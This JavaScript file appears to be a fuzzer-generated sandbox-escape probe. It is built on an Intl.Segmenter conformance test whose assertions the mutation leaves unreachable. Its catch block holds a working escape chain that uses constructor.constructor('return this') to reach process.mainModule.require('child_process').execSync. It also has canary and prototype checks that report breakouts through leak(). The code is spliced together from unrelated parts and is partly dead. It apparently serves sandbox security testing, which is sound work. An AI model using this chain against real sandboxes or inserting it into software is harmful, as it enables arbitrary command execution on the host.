try {
    const other_granularities = [
        undefined,
        'grapheme',
        'sentence'
    ];
    const inputs = [
        'Hello world!',
        'Jedovatou mambu objevila žena v zahrádkářské kolonii.',
        'Việt Nam: Nhất thể hóa sẽ khác Trung Quốc?',
        'Σοβαρές ενστάσεις Κομισιόν για τον προϋπολογισμό της Ιταλίας',
        'Решение Индии о покупке российских С-400 расценили как вызов США',
        'הרופא שהציל נשים והנערה ששועבדה ע',
        'ترامب للملك سلمان: أنا جاد للغاية.. عليك دفع المزيد',
        'भारत की एस 400 मिसाइल के मुकाबले पाक की थाड, जानें कौन कितना ताकतवर',
        'ரெட் அலர்ட் எச்சரிக்கை; புதுச்சேரியில் நாளை அரசு விடுமுறை!',
        '\'ఉత్తర్వులు అందే వరకు ఓటర్ల తుది జాబితాను వెబ్‌సైట్లో పెట్టవద్దు\'',
        '台北\u300B抹黑柯P失敗\uFF1F朱學恒酸\uFF1A姚文智氣pupu嗆大老闆',
        'วัดไทรตีระฆังเบาลงช่วงเข้าพรรษา เจ้าอาวาสเผยคนร้องเรียนรับผลกรรมแล้ว',
        '九州北部の一部が暴風域に入りました(日直予報士 2018年10月06日) - 日本気象協会 tenki.jp',
        '법원 \u201C다스 지분 처분권\xB7수익권 모두 MB가 보유\u201D'
    ];
    other_granularities.forEach(function (granularity) {
        let REPLACER = 23;
        const segmenter = new Intl.Segmenter(undefined, { granularity });
        inputs.forEach(function (input) {
            throw () => {
                return () => {
                };
            };
            const segment = segmenter.segment(input);
            for (let index = 0; index < input.length; index++) {
                const result = segment.containing(index);
                const msg = `granularity: ${ granularity } input: ${ input } containing(${ index })`;
                assert.sameValue(true, result.index >= 0, `${ msg } index >= 0`);
                assert.sameValue(true, result.index < input.length, `${ msg } index`);
                assert.sameValue('string', typeof result.input, `${ msg } input`);
                assert.sameValue(undefined, result.isWordLike, `${ msg } isWordLike should be undefined`);
            }
        });
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}